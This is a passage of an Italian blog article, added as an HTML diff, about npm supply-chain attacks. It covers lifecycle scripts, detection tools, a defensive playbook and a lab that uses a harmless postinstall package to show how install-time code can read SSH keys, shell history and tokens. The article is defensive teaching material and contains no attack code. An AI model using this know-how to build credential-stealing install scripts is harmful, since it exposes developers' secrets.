+
+<div class="stats-row">
+  <div class="stat-card">
+    <span class="stat-value">2.1M</span>
+    <span class="stat-label">pacchetti su npm</span>
+  </div>
+  <div class="stat-card">
+    <span class="stat-value">500K+</span>
+    <span class="stat-label">pacchetti su PyPI</span>
+  </div>
+  <div class="stat-card">
+    <span class="stat-value">600K+</span>
+    <span class="stat-label">crate su crates.io</span>
+  </div>
+  <div class="stat-card">
+    <span class="stat-value">~97%</span>
+    <span class="stat-label">del codice viene da dipendenze</span>
+  </div>
+</div>
+
+<p>
+  Rileggete quel 97%. Il software che gira sulle vostre macchine, il 97%, lo ha scritto gente che non avete mai visto in faccia. Mantenuto, forse, da altri sconosciuti. Scaricato in automatico da un registry centralizzato senza nessuna verifica oltre a un checksum. Il problema non e' che quel codice sia vulnerabile. Il problema e' che non sapete nemmeno che esiste.
+</p>
+
+<p>
+  L'ecosistema npm e' il piu' fragile di tutti. I lifecycle script (<code>preinstall</code>, <code>postinstall</code>, <code>prepare</code>) permettono l'esecuzione arbitraria di codice al momento dell'installazione. Fai <code>npm install</code> e ogni pacchetto nel tuo albero di dipendenze puo' lanciare uno script shell. Con i tuoi permessi. Sul tuo filesystem. Con accesso alle tue variabili d'ambiente, dove probabilmente tieni token API, credenziali del database, chiavi SSH. Tutto esposto.
+</p>
+
+<div class="warning-box">
+  <p><strong>La radice del problema: fiducia transitiva.</strong> Tu ti fidi di Express. Express si fida di body-parser. body-parser si fida di raw-body. La catena di fiducia e' lunga quanto l'albero delle dipendenze. E basta rompere un singolo anello perche' salti tutto.</p>
+</div>
+
+<table class="strategy-table">
+  <thead>
+    <tr>
+      <th>Ecosistema</th>
+      <th>Lifecycle scripts</th>
+      <th>Sandboxing</th>
+      <th>Signing</th>
+      <th>SBOM nativo</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td><code>npm</code></td>
+      <td>preinstall, postinstall, prepare</td>
+      <td>Nessuno</td>
+      <td>Opzionale (dal 2023)</td>
+      <td>No</td>
+    </tr>
+    <tr>
+      <td><code>pip</code></td>
+      <td>setup.py (esecuzione arbitraria)</td>
+      <td>Nessuno</td>
+      <td>Opzionale (PEP 740)</td>
+      <td>No</td>
+    </tr>
+    <tr>
+      <td><code>cargo</code></td>
+      <td>build.rs (compilazione)</td>
+      <td>Nessuno</td>
+      <td>Nessuno</td>
+      <td>No</td>
+    </tr>
+    <tr>
+      <td><code>go mod</code></td>
+      <td>Nessuno</td>
+      <td>Nessuno</td>
+      <td>checksum DB (sum.golang.org)</td>
+      <td>No</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>
+  Go e' l'unico che ha fatto una scelta radicale: zero lifecycle script. <code>go mod download</code> scarica codice e basta. Non esegue niente. Il codice viene compilato solo con <code>go build</code>, e a quel punto almeno il compilatore lo vede. Non elimina il problema (il codice malevolo puo' stare nel sorgente Go) ma elimina un intero vettore d'attacco: l'esecuzione al momento dell'installazione. Niente riesumazioni automatiche. Il cimitero resta chiuso finche' non lo apri tu.
+</p>
+
+
+<!-- ======================================================= -->
+<!-- SEZ. 06 - DETECTION                                    -->
+<!-- ======================================================= -->
+<h2><span class="accent">//</span> Detection: Come Trovare i Risorti</h2>
+<span class="section-number">Sezione 06. Strumenti e tecniche</span>
+
+<p>
+  Sapere che il problema esiste non basta. Servono tool per scansionare, monitorare, e reagire. Vi dico cosa funziona nel 2026 e cosa no. Pero' una cosa ve la dico subito: gli strumenti trovano quello che e' gia' stato scoperto. Le backdoor vere passano sempre prima.
+</p>
+
+<h3><code>npm audit</code> e i suoi limiti</h3>
+
+<div class="terminal-output">
+<span class="t-prompt">$</span> <span class="t-cmd">npm audit</span><br>
+<span class="t-out">found 12 vulnerabilities (3 low, 5 moderate, 3 high, 1 critical)</span><br>
+<span class="t-out">  run `npm audit fix` to fix 9 of them.</span><br>
+<span class="t-out">  3 vulnerabilities require manual review.</span>
+</div>
+
+<p>
+  <code>npm audit</code> controlla la lista di vulnerabilita' note (GitHub Advisory Database). Il problema: la lista contiene solo roba gia' scoperta. L'advisory per xz-utils e' uscito <em>dopo</em> la scoperta. Per i tre giorni in cui la backdoor era attiva, <code>npm audit</code> non avrebbe detto niente. Zero.
+</p>
+
+<h3>Analisi degli script di installazione</h3>
+
+<p>
+  Il primo campanello d'allarme e' la presenza di lifecycle script nel <code>package.json</code>. Si possono disabilitare globalmente con <code>--ignore-scripts</code>, pero' questo rompe parecchi pacchetti legittimi che compilano moduli nativi tipo <code>node-gyp</code>.
+</p>
+
+<div class="terminal-output">
+<span class="t-prompt">$</span> <span class="t-cmd">npm config set ignore-scripts true</span><br>
+<span class="t-out"># Disabilita tutti i lifecycle scripts. Radicale ma efficace.</span><br>
+<span class="t-out"># Poi riabiliti per quelli che ne hanno bisogno:</span><br>
+<span class="t-prompt">$</span> <span class="t-cmd">npx --package=bcrypt -- npm rebuild bcrypt</span>
+</div>
+
+<h3>Lockfile diffing</h3>
+
+<p>
+  Il <code>package-lock.json</code> registra ogni dipendenza con il suo hash SHA-512. Se qualcuno pubblica una nuova versione di un pacchetto con lo stesso numero di versione (si', si puo' fare su npm con <code>--force</code>), l'hash cambia. Un diff del lockfile nel CI e' il check piu' economico che potete fare:
+</p>
+
+<div class="code-block" data-lang="Bash">
+  <div class="code-wrap">
+    <table>
+      <tr><td class="ln">1</td><td class="code"><span class="cm">#!/bin/bash</span></td></tr>
+      <tr><td class="ln">2</td><td class="code"><span class="cm"># ci-lockfile-check.sh</span></td></tr>
+      <tr><td class="ln">3</td><td class="code"><span class="cm"># Fallisce se il lockfile cambia senza che package.json sia cambiato</span></td></tr>
+      <tr><td class="ln">4</td><td class="code"></td></tr>
+      <tr><td class="ln">5</td><td class="code"><span class="kw">if</span> git diff --name-only HEAD~1 | grep -q <span class="st">"package-lock.json"</span>; <span class="kw">then</span></td></tr>
+      <tr><td class="ln">6</td><td class="code">    <span class="kw">if</span> ! git diff --name-only HEAD~1 | grep -q <span class="st">"package.json"</span>; <span class="kw">then</span></td></tr>
+      <tr><td class="ln">7</td><td class="code">        echo <span class="st">"ALERT: lockfile changed without package.json change"</span></td></tr>
+      <tr><td class="ln">8</td><td class="code">        echo <span class="st">"Possible supply chain attack. Review manually."</span></td></tr>
+      <tr><td class="ln">9</td><td class="code">        <span class="kw">exit</span> <span class="nb">1</span></td></tr>
+      <tr><td class="ln">10</td><td class="code">    <span class="kw">fi</span></td></tr>
+      <tr><td class="ln">11</td><td class="code"><span class="kw">fi</span></td></tr>
+    </table>
+  </div>
+</div>
+
+<h3>Socket.dev e analisi statica dei pacchetti</h3>
+
+<p>
+  Socket.dev fa una cosa interessante: analisi statica del codice dei pacchetti npm <em>prima</em> dell'installazione. Cerca pattern sospetti: chiamate a <code>eval()</code>, accesso alla rete durante l'install, lettura di env var, esecuzione di child process. Genera un report con risk score per ogni dipendenza. Non e' perfetto, ma e' una rete in piu'.
+</p>
+
+<h3>Reproducible builds</h3>
+
+<p>
+  L'arma nucleare. Se il build e' deterministico (stesso sorgente = stesso binario, byte per byte), qualsiasi modifica al processo di compilazione diventa visibile. Debian, Arch e NixOS hanno programmi attivi su questo fronte. Con i reproducible build xz-utils sarebbe stato beccato al volo: il binario prodotto dai sorgenti puliti non avrebbe matchato quello nella distro.
+</p>
+
+<div class="insight-box">
+  <p><strong>Lo stato dell'arte:</strong> nessuno di questi tool da solo basta. <code>npm audit</code> vede solo le vuln note. Il lockfile diffing non vede attacchi che arrivano come versioni nuove legittime. Socket.dev ha falsi positivi. I reproducible build richiedono un'infrastruttura che quasi nessuno ha. La difesa funziona in profondita': tutti questi tool insieme, con review umana dove conta.</p>
+</div>
+
+
+<!-- ======================================================= -->
+<!-- SEZ. 07 - DIFESA                                       -->
+<!-- ======================================================= -->
+<h2><span class="accent">//</span> Come Difendersi (Per Davvero)</h2>
+<span class="section-number">Sezione 07. Playbook operativo</span>
+
+<p>
+  Dopo tre case study e cinque meccanismi di resurrezione, cosa fate concretamente lunedi' mattina? Ecco il playbook in ordine di impatto.
+</p>
+
+<h3>1. Pinning aggressivo</h3>
+
+<p>
+  Bloccate le versioni esatte delle dipendenze. Niente <code>^</code>, niente <code>~</code>, niente range. Versioni esatte nel <code>package.json</code>, lockfile committato in git, <code>npm ci</code> nel CI che fallisce se il lockfile non matcha.
+</p>
+
+<div class="code-block" data-lang="JSON">
+  <div class="code-wrap">
+    <table>
+      <tr><td class="ln">1</td><td class="code"><span class="cm">// NO: accetta qualsiasi minor/patch</span></td></tr>
+      <tr><td class="ln">2</td><td class="code"><span class="key">"express"</span>: <span class="st">"^4.18.0"</span></td></tr>
+      <tr><td class="ln">3</td><td class="code"></td></tr>
+      <tr><td class="ln">4</td><td class="code"><span class="cm">// SI': versione esatta, nessuna sorpresa</span></td></tr>
+      <tr><td class="ln">5</td><td class="code"><span class="key">"express"</span>: <span class="st">"4.18.2"</span></td></tr>
+    </table>
+  </div>
+</div>
+
+<p>
+  Questo non vi protegge da un maintainer compromesso che pubblica una versione nuova. Vi protegge dal fatto che la versione nuova venga scaricata nella vostra build senza che nessuno la guardi.
+</p>
+
+<h3>2. Disabilitate i lifecycle script per default</h3>
+
+<div class="terminal-output">
+<span class="t-prompt">$</span> <span class="t-cmd">echo "ignore-scripts=true" >> .npmrc</span><br>
+<span class="t-prompt">$</span> <span class="t-cmd">echo "# Pacchetti che necessitano di script di build:" >> .npmrc</span><br>
+<span class="t-prompt">$</span> <span class="t-cmd">echo "# bcrypt, sharp, sqlite3: riabilitare manualmente" >> .npmrc</span>
+</div>
+
+<h3>3. Vendorate le dipendenze critiche</h3>
+
+<p>
+  Per i pacchetti da cui dipende la sicurezza del progetto (crypto, auth, parsing), copiate il codice sorgente nel vostro repository. Si', e' scomodo. Si', gli aggiornamenti li fate a mano. Ma se <code>jsonwebtoken</code> viene compromesso stasera, il vostro fork locale non cambia.
+</p>
+
+<h3>4. SBOM e monitoraggio continuo</h3>
+
+<p>
+  Generate un Software Bill of Materials (SBOM) a ogni build. Tool come <code>syft</code> (Anchore) o <code>cdxgen</code> (CycloneDX) producono un inventario completo di tutto quello che finisce nel vostro artefatto. Quando esce un advisory, sapete in secondi se siete esposti.
+</p>
+
+<div class="terminal-output">
+<span class="t-prompt">$</span> <span class="t-cmd">syft dir:./node_modules -o cyclonedx-json > sbom.json</span><br>
+<span class="t-out">Cataloged packages: 847</span><br>
+<span class="t-out">Output written to: sbom.json</span><br>
+<br>
+<span class="t-prompt">$</span> <span class="t-cmd">grype sbom:sbom.json</span><br>
+<span class="t-out">NAME              VERSION  VULNERABILITY  SEVERITY</span><br>
+<span class="t-out">json5             2.2.1    CVE-2022-46175 HIGH</span><br>
+<span class="t-out">semver            7.3.7    CVE-2022-25883 MEDIUM</span><br>
+<span class="t-warn">Found 2 vulnerabilities</span>
+</div>
+
+<h3>5. Firma e verifica</h3>
+
+<p>
+  npm supporta la firma dei pacchetti dal 2023 (npm provenance). I pacchetti con provenance includono un link al commit esatto e alla CI run che li ha prodotti. Se un pacchetto ha provenance, sapete che il tarball su npm corrisponde al codice su GitHub. Se non ce l'ha, state andando sulla fiducia.
+</p>
+
+<div class="terminal-output">
+<span class="t-prompt">$</span> <span class="t-cmd">npm audit signatures</span><br>
+<span class="t-out">audited 847 packages in 3s</span><br>
+<span class="t-out">523 packages have verified registry signatures</span><br>
+<span class="t-out">142 packages have verified attestations</span><br>
+<span class="t-warn">182 packages have no signatures or attestations</span>
+</div>
+
+
+<!-- ======================================================= -->
+<!-- SEZ. 08 - LABORATORIO                                  -->
+<!-- ======================================================= -->
+<h2><span class="accent">//</span> Apri il Tuo Cimitero</h2>
+<span class="section-number">Sezione 08. Laboratorio: vedi, sfrutta, capisci</span>
+
+<p>
+  Se pensate che questa sia teoria, fermatevi. Aprite un progetto vostro. Uno qualsiasi con un <code>node_modules</code>. Ho preparato tre script che vi fanno vedere con i vostri occhi cosa succede. Il codice e' tutto nel repo, clonatelo e lanciateli: <a href="https://github.com/Pinperepette/signal.pirate/tree/main/scripts/il-codice-risorge" target="_blank" rel="noopener" style="color: var(--accent-attention);">github.com/Pinperepette/signal.pirate/scripts/il-codice-risorge</a>
+</p>
+
+<h3>Step 1: Lo Scanner (apri il cimitero)</h3>
+
+<p>
+  Il primo script, <code>graveyard-scanner.js</code>, vi apre il cimitero. Lo puntate verso un <code>node_modules</code> qualsiasi e lui scansiona tutto: cerca lifecycle script sospetti, chiamate a <code>eval()</code>, accesso a <code>process.env</code>, child process, accessi a <code>.ssh</code> e alla shell history. Roba che un pacchetto che fa parsing di date non dovrebbe fare.
+</p>
+
+<p>
+  L'ho lanciato su un progetto Electron reale. 541 pacchetti. Risultato:
+</p>
+
+<figure>
+  <img src="../immagini/il-codice-risorge/scanner.png" alt="Output del graveyard scanner: 541 pacchetti, 179 sospetti" style="width: 100%; border-radius: 10px; border: 1px solid rgba(0,255,136,0.12);">
+  <figcaption style="font-family: var(--font-mono); font-size: 0.75rem; color: var(--text-secondary); text-align: center; margin-top: 0.8rem;">541 pacchetti scansionati. 179 sospetti. Lifecycle script, eval(), child_process, process.env ovunque.</figcaption>
+</figure>
+
+<p>
+  179 sospetti su 541. Un terzo. La maggior parte sono falsi positivi: pacchetti legittimi che usano <code>child_process</code> per compilare moduli nativi, tool che leggono <code>process.env</code> per la configurazione. Ma quanti di quei 179 pacchetti avete letto davvero? Quanti sapevate che esistessero nel vostro progetto? Ecco.
+</p>
+
+<h3>Step 2: Esegui il Morto (il momento "holy shit")</h3>
+
+<p>
+  Il secondo script e' un pacchetto npm finto, <code>totally-safe-package</code>, con un <code>postinstall</code> che vi mostra cosa puo' leggere un pacchetto qualsiasi quando lo installate. Non esfiltriamo niente, stampiamo e basta. Ma guardate cosa esce:
+</p>
+
+<figure>
+  <img src="../immagini/il-codice-risorge/postinstall.png" alt="Output del postinstall: chiavi SSH, history, config file tutti accessibili" style="width: 100%; border-radius: 10px; border: 1px solid rgba(0,255,136,0.12);">
+  <figcaption style="font-family: var(--font-mono); font-size: 0.75rem; color: var(--text-secondary); text-align: center; margin-top: 0.8rem;">Chiavi SSH private, 15.000+ comandi nella history, .npmrc, docker config, gitconfig. Tutto leggibile. Con un npm install.</figcaption>
+</figure>
+
+<p>
+  Le chiavi SSH private, con tanto di dimensione in byte. La history della shell con 15.000 comandi, compresi gli ultimi 5. Il file <code>.npmrc</code> (dove magari avete un token npm). Il <code>.docker/config.json</code>. Il <code>.gitconfig</code>. Tutto leggibile. Tutto accessibile. Con un <code>npm install</code>. Senza root. Senza sudo. Senza che nessuno vi chieda niente.
+</p>
+
+<p>
+  Tutto quello che vedete stampato, un pacchetto malevolo lo avrebbe spedito a un server. In silenzio.
+</p>
+
+<h3>Step 3: La Resurrezione Controllata</h3>
+
+<p>
+  Ultimo step. Lo script <code>resurrection-lab.sh</code> simula un supply chain attack completo. Crea un pacchetto pulito (versione 1.0.0), un progetto vittima lo installa, poi il pacchetto viene "avvelenato" con una 1.0.1 che ha un <code>postinstall</code>. La vittima reinstalla le dipendenze e...
+</p>
+
+<figure>
+  <img src="../immagini/il-codice-risorge/attacco.png" alt="Output della simulazione di attacco: il pacchetto avvelenato si installa senza warning" style="width: 100%; border-radius: 10px; border: 1px solid rgba(0,255,136,0.12);">
+  <figcaption style="font-family: var(--font-mono); font-size: 0.75rem; color: var(--text-secondary); text-align: center; margin-top: 0.8rem;">Il pacchetto avvelenato si installa. Il postinstall gira. "found 0 vulnerabilities". Nessun warning.</figcaption>
+</figure>
+
+<p>
+  Guardate la riga in fondo. "found 0 vulnerabilities". npm non ha trovato niente di strano. Il pacchetto e' passato dalla 1.0.0 alla 1.0.1, il <code>^</code> nel <code>package.json</code> ha permesso l'upgrade automatico, il postinstall si e' eseguito. Nessun warning, nessuna conferma, nessun log.
+</p>
+
+<div class="warning-box">
+  <p><strong>Provateli.</strong> Gli script sono nel repo, li clonate e li lanciate in due minuti. Non serve installare niente di strano. Quello che vedrete non e' un exploit. Non avete sfruttato una vulnerabilita'. Avete solo usato il sistema come e' stato progettato.</p>
+</div>
+
+
+<!-- ======================================================= -->
+<!-- SEZ. 09 - LA LEZIONE                                   -->
+<!-- ======================================================= -->
+<h2><span class="accent">//</span> La Lezione di Pasqua</h2>
+<span class="section-number">Sezione 09. Resurrezioni indesiderate</span>
+
+<p>
+  C'e' codice che gira in produzione adesso, in questo momento, su macchine che gestiscono carte di credito, dati sanitari, infrastrutture critiche, che nessun essere umano ha mai letto. Sta in <code>node_modules</code>, quinto livello di profondita', funzione utility di 30 righe che qualcuno ha scritto nel 2016 e non tocca da anni. Fa il suo lavoro. Per adesso.
+</p>
+
+<p>
+  "Mi fido delle mie dipendenze perche' sono open source e qualcuno le avra' controllate." Nessuno le ha controllate. L'open source viene con la <em>possibilita'</em> della review, che e' una cosa molto diversa dalla certezza. E' un atto di fede. Letteralmente.
+</p>
+
+<p>
+  Jia Tan ha dimostrato che con due anni di pazienza avveleni un progetto critico dell'infrastruttura Linux. L'attaccante di event-stream ha dimostrato che basta chiedere gentilmente al maintainer giusto. Il compromesso di ua-parser-js ha dimostrato che l'account npm di una sola persona e' il single point of failure per milioni di installazioni.
+</p>
+
+<p>
+  La prossima backdoor non la trovera' un ingegnere che profila SSH per mezzo secondo. La trovera' uno scanner, forse. O non la trovera' nessuno.
+</p>
+
+<p>
+  <code>node_modules</code> e' un cimitero. Ogni <code>npm install</code> e' una riesumazione. E il problema non e' il codice malevolo. Il problema e' che gira con il vostro consenso.
+</p>
+
+
+<!-- ============================================================
+     CONCLUSIONE
+     ============================================================ -->
+<div class="conclusion-box fade-in">
+  <div class="quote">"npm install non scarica dipendenze. Concede fiducia."</div>
+  <p style="color: var(--text-secondary); margin: 1rem 0 0;">
+    Tre case study. Cinque meccanismi di resurrezione. Un modello di fiducia
+    costruito sulla speranza che qualcun altro abbia letto il codice.
+    Il 97% del software che gira sulle vostre macchine lo ha scritto gente
+    che non conoscete. Raga, buona Pasqua /all. Che il vostro node_modules
+    resti in pace, almeno fino al prossimo npm install.
+  </p>
+  <p style="color: var(--text-secondary); margin: 0.5rem 0 0; font-family: var(--font-mono); font-size: 0.8rem;">
+    Signal Pirate
+  </p>
+</div>
+
+</article>
+
+<!-- Footer -->
+<footer class="footer">
+  <p>Signal Pirate | <a href="https://github.com/pinperepette" target="_blank" rel="noopener">Andrea Amani</a> aka The Pirate</p>
+  <p style="margin-top: 0.5rem; opacity: 0.5;">Reverse engineering dell'attenzione digitale</p>
+</footer>
+
+<!-- Scripts -->
+<script src="../js/main.js"></script>
+
+</body>
+</html>
